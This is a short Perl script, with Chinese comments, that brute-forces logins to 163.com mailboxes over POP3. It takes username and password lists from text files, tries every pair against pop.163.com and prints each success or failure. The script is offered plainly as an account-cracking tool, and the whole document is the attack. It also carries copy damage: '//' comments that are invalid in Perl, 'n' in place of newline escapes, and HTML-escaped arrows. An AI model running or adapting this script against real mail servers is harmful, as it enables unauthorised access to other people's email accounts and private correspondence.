use Net::POP3;
$email="pop.163.com";          //设置pop服务器地址 qq为pop.qq.com
$pop = Net::POP3-&gt;new($email)or die("ERROR: Unable to initiate. ");
print $pop-&gt;banner();
$pop-&gt;quit;
$i=0;
open(fp1,"user.txt");      
@array1=&lt;fp1&gt;;
open(fp2,"pass.txt");
@array2=&lt;fp2&gt;;                     //从文件中获取邮箱用户名及密码
foreach $a(@array1) {
$u=substr($a,0,length($a)-1);
$u=$u."@163.com";
foreach $b(@array2) {
$p=substr($b,0,length($b)-1);
print "cracked with ".$u."-----".$p."n";
$i=$i+1;
$pop = Net::POP3-&gt;new($email)or die("ERROR: Unable to initiate. ");
$m=$pop-&gt;login($u,$p);              //尝试登录邮箱
if($m&gt;0)
{
  print $u."------------".$p."----"."success"."n";
  $pop-&gt;quit;
}                                //成功登录
else
{
  print $u."------------".$p."----"."failed"."n";
  $pop-&gt;quit;                                     //登录失败
}
}
}
print $i;